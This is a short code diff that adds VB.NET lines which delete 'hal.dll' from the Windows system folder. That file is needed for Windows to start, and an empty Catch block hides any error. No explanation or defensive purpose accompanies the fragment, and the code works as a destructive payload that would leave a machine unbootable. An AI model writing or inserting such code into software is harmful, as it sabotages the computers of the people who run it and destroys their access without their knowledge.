@@ -1,0 +1,4 @@
+Try
+   IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\hal.dll")
+Catch
+End Try
